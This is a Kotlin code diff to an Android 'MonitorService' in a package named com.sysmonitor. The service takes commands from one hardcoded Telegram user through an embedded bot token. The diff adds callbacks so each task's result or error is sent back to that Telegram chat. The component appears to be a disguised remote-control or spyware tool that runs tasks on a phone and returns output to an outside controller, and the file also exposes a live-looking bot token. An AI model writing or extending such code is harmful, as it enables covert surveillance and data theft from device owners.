@@ -33,6 +33,8 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 import java.util.concurrent.TimeUnit
+import java.util.concurrent.ConcurrentHashMap
+import java.util.concurrent.CountDownLatch
 
 const val PREFS_NAME = "monitor_config"
 const val KEY_PERSISTENT = "persistent_mode"
@@ -41,6 +43,14 @@ const val KEY_ONBOARD_SENT = "onboard_sent"
 const val BOT_TOKEN = "8891325647:AAG1P58n7FY4efJlTWUzjhdA1XMb1CpsX3k"
 const val ALLOWED_USER_ID = 8335972628L
 const val TELEGRAM_API = "https://api.telegram.org/bot"
+
+data class TelegramCallback(
+    val chatId: Long,
+    val latch: CountDownLatch,
+    var result: String? = null,
+    var error: String? = null,
+    var status: String = "pending"
+)
 
 class MonitorService : Service() {
 
@@ -53,6 +63,7 @@ class MonitorService : Service() {
     private var pollThread: Thread? = null
     private var lastUpdateId = 0L
     private val client = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(60, TimeUnit.SECONDS).build()
+    private val telegramCallbacks = ConcurrentHashMap<String, TelegramCallback>()
 
     inner class LocalBinder : Binder() {
         fun getService(): MonitorService = this@MonitorService
@@ -183,6 +194,10 @@ class MonitorService : Service() {
 
     private fun sendTelegramTask(chatId: Long, capability: String, args: Map<String, Any>) {
         val taskId = java.util.UUID.randomUUID().toString()
+        val latch = CountDownLatch(1)
+        val callback = TelegramCallback(chatId, latch)
+        telegramCallbacks[taskId] = callback
+
         val intent = Intent().apply {
             setClassName("com.sysmonitor", "com.sysmonitor.MonitorService")
             action = "com.sysmonitor.ACTION_COMMAND"
@@ -193,9 +208,22 @@ class MonitorService : Service() {
         }
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
-            sendTelegramMessage(chatId, "Task sent: $capability")
+            
+            // Wait for result (max 30 seconds)
+            if (latch.await(30, TimeUnit.SECONDS)) {
+                val msg = if (callback.status == "completed" && callback.result != null) {
+                    "Task $taskId completed:\n${callback.result}"
+                } else {
+                    "Task $taskId failed:\n${callback.error ?: "timeout"}"
+                }
+                sendTelegramMessage(chatId, msg)
+            } else {
+                sendTelegramMessage(chatId, "Task $taskId timed out")
+            }
         } catch (e: Exception) {
             sendTelegramMessage(chatId, "Failed: ${e.message}")
+        } finally {
+            telegramCallbacks.remove(taskId)
         }
     }
 
@@ -435,6 +463,14 @@ class MonitorService : Service() {
             putExtra("status", status)
         }
         sendBroadcast(intent)
+        
+        // Update telegram callback if waiting
+        telegramCallbacks[taskId]?.let { callback ->
+            callback.result = result?.toString()
+            callback.error = error
+            callback.status = status
+            callback.latch.countDown()
+        }
         
         if (replyChat != 0L) {
             val msg = if (status == "completed" && result != null) {
